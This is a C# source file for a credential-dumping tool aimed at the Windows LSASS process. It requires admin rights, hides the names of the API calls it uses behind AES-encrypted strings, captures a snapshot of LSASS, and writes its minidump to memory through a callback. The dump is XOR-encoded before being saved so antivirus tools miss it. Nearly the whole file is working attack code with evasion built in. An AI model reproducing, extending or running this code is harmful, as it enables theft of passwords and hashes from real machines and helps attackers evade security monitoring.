using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using static CustomD.Configuration;
using static CustomD.HelperFunctions;
using static CustomD.Win32;


namespace CustomD
{
    internal class DumpProc
    {
        // Get process by name using NtGetNextProcess and GetProcessImageFileName
        public static int GetByName(string proc_name)
        {
            // Resolve functions from delegates
            IntPtr k32 = GetLibAddress(Kernel32_enc_str);
            IntPtr ntdll = GetLibAddress(Ntdll_enc_str);
            // Load Psapi.dll library
            LoadLibraryDelegate auxLoadLibrary = (LoadLibraryDelegate)GetFuncDelegate(k32, LoadLibrary_enc_str, typeof(LoadLibraryDelegate));
            String Psapi_dec_str = DecryptStringFromBytes(Psapi_enc_str, Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            IntPtr psapi = auxLoadLibrary(Psapi_dec_str);
            GetProcessIdDelegate auxGetProcessId = (GetProcessIdDelegate)GetFuncDelegate(k32, GetProcessId_enc_str, typeof(GetProcessIdDelegate));
            NtGetNextProcessDelegate auxNtGetNextProcess = (NtGetNextProcessDelegate)GetFuncDelegate(ntdll, NtGetNextProcess_enc_str, typeof(NtGetNextProcessDelegate));
            GetProcessImageFileNameDelegate auxGetProcessImageFileName = (GetProcessImageFileNameDelegate)GetFuncDelegate(psapi, GetProcessImageFileName_enc_str, typeof(GetProcessImageFileNameDelegate));

            // Loop to check each process
            IntPtr aux_handle = IntPtr.Zero;
            int MAXIMUM_ALLOWED = 0x02000000;
            int pid = 0;
            while (!auxNtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, out aux_handle))
            {
                StringBuilder fileName = new StringBuilder(100);
                auxGetProcessImageFileName(aux_handle, fileName, 100);
                char[] stringArray = fileName.ToString().ToCharArray();
                Array.Reverse(stringArray);
                string reversedStr = new string(stringArray);
                string res = reversedStr.Substring(0, reversedStr.IndexOf("\\"));
                stringArray = res.ToString().ToCharArray();
                Array.Reverse(stringArray);
                reversedStr = new string(stringArray);
                if (reversedStr == proc_name)
                {
                    pid = auxGetProcessId(aux_handle);
                    return pid;
                }
            }
            return 0;
        }


        public static bool CallBackFunction(int CallbackParam, IntPtr PointerCallbackInput, IntPtr PointerCallbackOutput)
        {
            var callbackInput = Marshal.PtrToStructure<MINIDUMP_CALLBACK_INPUT>(PointerCallbackInput);
            var callbackOutput = Marshal.PtrToStructure<MINIDUMP_CALLBACK_OUTPUT>(PointerCallbackOutput);

            // IoStartCallback
            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoStartCallback)
            {
                // Set S_FALSE in output
                callbackOutput.status = 0x1;
                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
            }

            // IoWriteAllCallback
            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback)
            {
                // Copy buffer
                Marshal.Copy(callbackInput.Io.Buffer, Program.dumpBuffer, (int)callbackInput.Io.Offset, callbackInput.Io.BufferBytes);
                Program.bufferSize += callbackInput.Io.BufferBytes;
                // Set S_OK in output
                callbackOutput.status = 0;
                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
            }

            // IoWriteAllCallback
            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoFinishCallback)
            {
                // Set S_OK in output
                callbackOutput.status = 0;
                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
            }
            return true;
        }


        static void EncodeBuffer(byte[] dumpBuffer, int bufferSize, byte xor_byte)
        {
            for (int i = 0; i < bufferSize; i++)
            {
                dumpBuffer[i] = (byte)(dumpBuffer[i] ^ xor_byte);
            }
        }


        static void CheckPrivileges()
        {
            if (WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid) == false)
            {
                Console.WriteLine("[-] Error: Execute with administrative privileges.");
                Environment.Exit(0);
            }
        }


        [Flags]
        internal enum PSS_CAPTURE_FLAGS : uint
        {
            PSS_CAPTURE_NONE = 0x00000000,
            PSS_CAPTURE_VA_CLONE = 0x00000001,
            PSS_CAPTURE_RESERVED_00000002 = 0x00000002,
            PSS_CAPTURE_HANDLES = 0x00000004,
            PSS_CAPTURE_HANDLE_NAME_INFORMATION = 0x00000008,
            PSS_CAPTURE_HANDLE_BASIC_INFORMATION = 0x00000010,
            PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION = 0x00000020,
            PSS_CAPTURE_HANDLE_TRACE = 0x00000040,
            PSS_CAPTURE_THREADS = 0x00000080,
            PSS_CAPTURE_THREAD_CONTEXT = 0x00000100,
            PSS_CAPTURE_THREAD_CONTEXT_EXTENDED = 0x00000200,
            PSS_CAPTURE_RESERVED_00000400 = 0x00000400,
            PSS_CAPTURE_VA_SPACE = 0x00000800,
            PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION = 0x00001000,
            PSS_CREATE_BREAKAWAY_OPTIONAL = 0x04000000,
            PSS_CREATE_BREAKAWAY = 0x08000000,
            PSS_CREATE_FORCE_BREAKAWAY = 0x10000000,
            PSS_CREATE_USE_VM_ALLOCATIONS = 0x20000000,
            PSS_CREATE_MEASURE_PERFORMANCE = 0x40000000,
            PSS_CREATE_RELEASE_SECTION = 0x80000000
        }


        [DllImport("kernel32")]
        internal static extern uint PssCaptureSnapshot(
            IntPtr ProcessHandle,
            uint CaptureFlags,
            uint ThreadContextFlags,
            out IntPtr SnapshotHandle);

        [DllImport("kernel32")]
        internal static extern uint PssFreeSnapshot(
            IntPtr ProcessHandle,
            IntPtr SnapshotHandle);


        public static void DumpLsass(string filename)
        {
            // Check we are running an elevated process
            CheckPrivileges();

            // Resolve functions from delegates
            IntPtr k32 = GetLibAddress(Kernel32_enc_str);
            OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)GetFuncDelegate(k32, OpenProcess_enc_str, typeof(OpenProcessDelegate));
            LoadLibraryDelegate auxLoadLibrary = (LoadLibraryDelegate)GetFuncDelegate(k32, LoadLibrary_enc_str, typeof(LoadLibraryDelegate));
            // Load dbgcore library
            String Dbgcore_dec_str = DecryptStringFromBytes(Dbgcore_enc_str, Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            IntPtr dbgc = auxLoadLibrary(Dbgcore_dec_str);
            MinidumpWriteDelegate auxMiniDumpWriteDump = (MinidumpWriteDelegate)GetFuncDelegate(dbgc, MinidumpWriteDump_enc_str, typeof(MinidumpWriteDelegate));

            //Get process PID
            String Lsass_dec_str = DecryptStringFromBytes(Lsass_enc_str, Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            int processPID = GetByName(Lsass_dec_str); // Process.GetProcessesByName(decryptedProcess)[0].Id;
            Console.WriteLine("[+] Process PID: " + processPID);

            // Open handle to the process
            uint PROCESS_ALL_ACCESS = 0x1F0FFF;
            IntPtr processHandle = auxOpenProcess(PROCESS_ALL_ACCESS, false, processPID);

            if (processHandle != INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[+] Process handle: \t0x" + processHandle.ToString("X"));
                Console.ReadKey();

                // Create snapshot
                IntPtr snapshotHandle;
                uint flags = 0x400001FD; // var flags = PSS_CAPTURE_FLAGS.PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLES | PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREADS | PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_FLAGS.PSS_CREATE_MEASURE_PERFORMANCE;
                uint CONTEXT_ALL = 0x0010001F;
                PssCaptureSnapshot(processHandle, flags, CONTEXT_ALL, out snapshotHandle);

                if (snapshotHandle != INVALID_HANDLE_VALUE)
                {
                    Console.WriteLine("[+] Snapshot handle: \t0x" + snapshotHandle.ToString("X"));
                    Console.ReadKey();

                    // Dump the process
                    CallBack MyCallBack = new CallBack(CallBackFunction);
                    MINIDUMP_CALLBACK_INFORMATION mci;
                    mci.CallbackRoutine = Marshal.GetFunctionPointerForDelegate(MyCallBack);
                    mci.CallbackParam = IntPtr.Zero;
                    IntPtr mci_pointer = Marshal.AllocHGlobal(Marshal.SizeOf(mci));
                    Marshal.StructureToPtr(mci, mci_pointer, true);
                    bool isRead = auxMiniDumpWriteDump(processHandle, processPID, IntPtr.Zero, 2, IntPtr.Zero, IntPtr.Zero, mci_pointer);
                    // bool isRead = auxMiniDumpWriteDump(snapshotHandle, processPID, IntPtr.Zero, 2, IntPtr.Zero, IntPtr.Zero, mci_pointer);
                    Marshal.FreeHGlobal(mci_pointer);
                    if (!isRead)
                    {
                        Console.WriteLine("[-] Error: Process not dumped.");
                    }

                    // Free snapshot
                    Console.WriteLine("[+] Freeing snapshot...");
                    PssFreeSnapshot(auxOpenProcess(0x1F0FFF, false, Process.GetCurrentProcess().Id), snapshotHandle);

                    // Close handle
                    Console.WriteLine("[+] Closing handle...");
                    CloseHandle(processHandle);

                    /*
                    // Print information about dump in memory 
                    GCHandle pinnedArray = GCHandle.Alloc(dumpBuffer, GCHandleType.Pinned);
                    IntPtr dumpBuffer_pointer = pinnedArray.AddrOfPinnedObject();
                    Console.WriteLine("[+] Dump address: \t\t0x" + dumpBuffer_pointer.ToString("X"));
                    Console.WriteLine("[+] Dump size: \t\t\t" + bufferSize + " bytes");
                    pinnedArray.Free();
                    */

                    // Encode buffer
                    byte xor_byte = (byte)0xCC;
                    EncodeBuffer(Program.dumpBuffer, Program.bufferSize, xor_byte);

                    // Write to file
                    IntPtr hFile = CreateFileA(filename, GENERIC_ALL, FILE_SHARE_WRITE, IntPtr.Zero, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
                    WriteFile(hFile, Program.dumpBuffer, (uint)Program.bufferSize, out _, IntPtr.Zero);
                    Console.WriteLine("[+] File " + filename);
                }
                else 
                {
                    Console.WriteLine("[-] Failed calling PssCaptureSnapshot. Snapshot handle is NULL.");
                }
            }
            else
            {
                Console.WriteLine("[-] Failed callin OpenProcess. Process handle is NULL.");
            }
        }

    }
}
